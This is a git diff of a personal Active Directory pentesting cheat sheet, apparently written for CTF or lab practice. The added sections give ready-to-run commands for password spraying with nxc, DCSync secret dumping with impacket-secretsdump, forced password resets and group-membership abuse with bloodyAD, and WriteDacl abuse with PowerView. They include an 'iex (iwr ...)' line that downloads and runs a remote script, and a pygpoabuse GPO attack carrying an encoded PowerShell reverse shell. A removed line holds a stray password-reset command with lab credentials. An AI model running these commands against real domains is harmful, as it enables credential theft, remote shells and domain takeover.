@@ -15,6 +15,11 @@
 - <<perms, Permisions in AD>>
   * <<generetic, GenereticAll>>
   * <<generetic, GenereticWrite>>
+  * <<DCSync, DCSync>>
+  * <<ForceChangePassword, ForceChangePassword>>
+  * <<Groups, Groups>>
+  * <<WriteDacl, WriteDacl>>
+  * <<GPO, GPO abuse>>
 - <<crack, Hashcat and John>>
   * <<hashcat, Hashcat>>
   * <<john, John>>
@@ -146,6 +151,18 @@ Take all files in Share
 mget *
 ```
 
+Method maybe users have a pass which mathes with their username
+
+```bash
+nxc smb $target -u users.txt -p users.txt
+```
+
+Or check one pass for wordlist of users
+
+```bash
+nxc smb $target -u users.txt -p 'some_pass'
+```
+
 [[NTLM]]
 == NTLM Relay Attack
 
@@ -154,6 +171,7 @@ If exists *WRITE* permision in the `share` can be crafted a phishing link to cat
 Also is needed to start `responder` with `sudo` perms in target network
 
 Agaist `tun0` can be anouther, 
+
 Permisions
 ```bash
 sudo responder -I tun0
@@ -171,8 +189,7 @@ nxc smb $target -u 'username' -p 'passwords'  -M slinky -o SHARE=Share  NAME=phi
 [[Bloodhound]]
 == Bloodhound
 
-*BloodHound* with Neo4j is used to *map and analyze* relationships inside an Active Directory environment. By storing AD objects and their connections in a Neo4j graph database, BloodHound helps security teams.*Identify hidden attack paths, privilege escalation routes, and misconfigurations* that could be exploited to gain bloodyAD --host "10.1.107.118" -d 'dc01.hacksmarter.local' -u  'yorinobu' -p  'FuckPass!@' set password 'soulkiller.svc' 'FuckPass!@!@@'
-higher access in the domain.
+*BloodHound* with Neo4j is used to *map and analyze* relationships inside an Active Directory environment. By storing AD objects and their connections in a Neo4j graph database, BloodHound helps security teams.*Identify hidden attack paths, privilege escalation routes, and misconfigurations* that could be exploited to gain  higher access in the domain.
 
 If port ralated to `ldap` is open can be grabbed info about system , also must be compromised user with valid creds.
 
@@ -201,9 +218,11 @@ Perms which can be enumerated by tool `bloodhound`
 
 
 [[generetic]]
-=== GenereticAlljohn --show hash.john
-certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
+=== GenericAll
 
+```bash
+certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
+```
 
 This permision over user gives a *full controll*, used to *change password* (common) or anouther things
 
@@ -216,13 +235,87 @@ bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' set pas
 So it's can be as "Change password of user2 by user with pass and change to pass2",
 
 [[generetic2]]
-=== GenereticWrite
+=== GenericWrite
 
 This permision over user can be used for changing atributes of target object so can be automated by tool `targetedKerberoast.py` , by atribute *servicePrincipalName* adds SPN and do kerberoasting. Could be cathed a hash of target user
 
 ```bash
 python3 targetedKerberoast.py -v -d '$target_domain' -u 'username' -p 'password' 
 ```
+
+[[DCSync]]
+=== DCSync 
+
+This perm is merge between *GetChanges* and *GetChangesAll* , All *secrets* can be dumped by `impacket-secretsdump`
+
+```bash
+impacket-secretsdump $domain/'$user':'$pass'@'$domain_ip'
+```
+
+[[ForceChangePassword]]
+=== ForceChangePassword
+
+Password of target user can be changed same can be done by tool `bloodyAD`
+
+```bash
+bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' set password 'user2' 'pass2'
+```
+
+[[Groups]]
+=== Groups
+
+If compromised user exists in group which have *GenericAll* or other privileges over anouther group compromised user can add self to target group
+
+```bash
+bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' add groupMember '$target_group' 'user'
+```
+
+[[WriteDacl]]
+=== WriteDacl
+
+WriteDacl this perm give us permision to modify the *Discretionary Access Control List(DACL)* so we can up privileges to whatever object in Active Directory. Can be done with PowerShell script *PowerView.ps1*
+
+Copy PowerView to target machine
+
+```bash
+python3 -m http.server 80 # kali machine
+
+curl http://$your_ip/PowerView.ps1 -O PowerView.ps1 # target machine
+```
+
+Anouther way more shortly
+
+```bash
+iex (iwr -usebasicparsing http://10.10.10.10/PowerView.ps1)
+```
+
+Add our user as object to group with *GenericAll* perm 
+
+```bash
+add-domainobjectacl -rights "all" -targetidentity "$target_user" -principalidentity "$compromised_user"
+```
+
+Set password for target user
+
+```bash
+$cred = ConvertTo-SecureString 'some_pass' -AsPlainText -Force
+# 
+set-domainuserpassword $target_user -accountpassword $cred
+```
+
+[[GPO]]
+=== GPO abuse
+
+If user have *GenericAll* of other google it over *Default Domain Policy* and *Default Domain Contraoller Policy* , great tool for exploatation this is python script `pygpoabuse` usage:
+
+```bash
+python3 pygpoabuse.py domain/user:'pass' -command "powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgA...<SNIP>...AGwAbwBzAGUAKAApAA==" -dc-ip 10.10.10.10 -gpo-id "00000000-016D-11D2-945F-00C04FB984F9"
+```
+
+Options:
+`-gpo-id` taken from bloodhound in Node field
+`-command` it's a reverse shell frome this https://www.revshells.com/[site]
+
 
 
 [[crack]]
@@ -248,13 +341,13 @@ hashcat -m 0 -a 0 hash_pass.txt rockyou.txt --keep-guessing -O
 [[john]]
 === John
 
-If exist some locked pdf, zip or anoutherjohn --show hash.john
+If exist some locked pdf, zip or anouther
  it's all the same process
 
 ```bash
 pdf2john file.pdf > hash.john 
 ```
-REMOTE MANAGEMENT USERS
+
 For `zip` files can be used tool `zip2john`
 
 Transform pdf hash to john format
